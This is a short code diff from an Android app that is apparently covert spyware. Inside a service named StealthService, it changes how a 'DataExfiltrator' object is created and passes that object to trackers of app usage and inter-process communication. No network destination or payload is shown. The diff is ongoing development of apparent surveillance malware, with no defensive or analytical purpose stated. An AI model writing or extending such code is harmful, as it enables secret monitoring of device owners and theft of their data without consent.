@@ -50,7 +50,7 @@ class StealthService : Service() {
         createNotificationChannel()
         startForegroundWithType()
 
-        exfiltrator = DataExfiltrator(this)
+        exfiltrator = DataExfiltrator.getInstance(this)
 //        Log.d(tag, "exfiltrator initialized successfully")
         usageTracker = AppUsageTracker(this, exfiltrator)
         ipcMonitor = IpcMonitor(this, exfiltrator)
